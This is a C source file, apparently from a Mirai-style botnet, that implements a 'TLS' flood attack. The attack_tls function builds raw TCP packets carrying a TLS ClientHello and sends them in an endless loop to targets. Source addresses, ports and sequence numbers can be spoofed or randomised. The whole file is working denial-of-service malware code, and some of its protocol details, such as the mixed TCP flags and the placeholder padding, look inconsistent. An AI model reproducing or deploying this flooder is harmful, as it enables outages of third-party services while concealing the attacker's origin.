#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <errno.h>
#include <time.h>
#include <string.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"

void attack_tls(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 443);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQ, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, 0);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    // TLS 1.2 ClientHello payload
    // This is a standard ClientHello that forces the server to allocate SSL context
    unsigned char tls_data[] = {
        0x16, 0x03, 0x01, 0x00, 0xE0, // TLS record: Handshake, TLS 1.0, length
        0x01, 0x00, 0x00, 0xDC,       // Handshake: ClientHello, length
        0x03, 0x03,                   // TLS 1.2
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Random (will be overwritten)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00,       // Session ID length = 0
        0x00, 0x36,                         // Cipher suites length
        0xC0, 0x2B, 0xC0, 0x2F, 0xC0, 0x0A, 0xC0, 0x09,
        0xC0, 0x13, 0xC0, 0x14, 0x00, 0x33, 0x00, 0x39,
        0x00, 0x2F, 0x00, 0x35, 0x00, 0x0A, 0x00, 0x05,
        0x00, 0x04, 0x00, 0x16, 0x00, 0x12, 0x00, 0x0D,
        0x00, 0x0E, 0x00, 0x0F, 0x00, 0x10, 0x00, 0x11,
        0x00, 0x06, 0x00, 0x07, 0x00, 0x08, 0x00, 0x09,
        0x00, 0x1A, 0x00, 0x1B, 0x00, 0x1C,
        0x01, 0x00,                         // Compression methods length, null
        0x00, 0x5D,                         // Extensions length
        0xFF, 0x01, 0x00, 0x01, 0x00,       // Renegotiation info
        0x00, 0x17, 0x00, 0x00,             // Extended master secret
        0x00, 0x0D, 0x00, 0x14, 0x00, 0x12, 0x04, 0x03, // Signature algorithms
        0x04, 0x01, 0x05, 0x03, 0x05, 0x01, 0x02, 0x03,
        0x02, 0x01, 0x04, 0x02, 0x02, 0x02, 0x06, 0x01,
        0x06, 0x03,
        0x00, 0x0B, 0x00, 0x02, 0x01, 0x00, // EC point formats
        0x00, 0x0A, 0x00, 0x0A, 0x00, 0x08, 0x00, 0x1D, // Named groups
        0x00, 0x17, 0x00, 0x19, 0x00, 0x18,
        0x00, 0x23, 0x00, 0x00,             // Session ticket
        0x00, 0x16, 0x00, 0x00,             // ALPN
        0x00, 0x15, 0x00, 0x01, 0x01        // Padding (not real - just to fill)
    };
    int pattern_len = sizeof(tls_data);
    int payload_len = pattern_len;

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting TLS attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *data;

        pkts[i] = calloc(1510, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        data = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htonl(seq);
        tcph->ack = htonl(ack);
        tcph->doff = 5;
        tcph->psh = 1;
        tcph->ack_seq = 1;
        tcph->syn = 1;
        tcph->window = rand_next() & 0xffff;

        util_memcpy(data, tls_data, payload_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                tcph->source = rand_next();
            if (dport == 0xffff)
                tcph->dest = rand_next();

            if (seq == 0xffff)
                tcph->seq = rand_next();

            // Randomize the random bytes in the TLS ClientHello
            *((uint32_t *)(data + 11)) = rand_next();
            *((uint32_t *)(data + 15)) = rand_next();
            *((uint32_t *)(data + 19)) = rand_next();
            *((uint32_t *)(data + 23)) = rand_next();

            tcph->check = 0;
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + payload_len), sizeof(struct tcphdr) + payload_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}
